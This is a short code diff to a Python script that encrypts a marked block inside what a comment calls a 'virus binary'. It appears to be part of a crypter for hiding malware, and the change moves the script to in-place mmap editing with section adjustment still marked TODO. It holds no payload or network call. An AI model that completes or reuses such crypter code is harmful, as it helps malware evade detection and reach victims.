@@ -27,12 +27,13 @@ def convertStrRepr2Bytes(par_str):
 
 #====================================================================================================
 def process(par_targetFilePath, par_cryptKey,par_markerValue):
+    import mmap
+    import pefile
     #1.Encrypt main body
     #Read file contents
     #(Virus binary not so big => its OK to read it all)
-    hFile=open(par_targetFilePath,"rb")
-    fileContents=bytearray(hFile.read())
-    hFile.close()
+    hFile=open(par_targetFilePath,"r+b")
+    fileContents=mmap.mmap(hFile.fileno(),0)
     #Search block to encrypt
     offset_cryptBlockBegin=fileContents.find(par_markerValue)+len(par_markerValue)
     cryptBlockSize=(offset_cryptBlockBegin+fileContents[offset_cryptBlockBegin:].find(par_markerValue)) - offset_cryptBlockBegin
@@ -42,9 +43,8 @@ def process(par_targetFilePath, par_cryptKey,par_markerValue):
     
     #2.Adjust section characteristics
     #TODO
-    #Write result
-    hFile = open(par_targetFilePath, "wb")
-    hFile.write(fileContents)
+
+    fileContents.close()
     hFile.close()
 
 #====================================================================================================
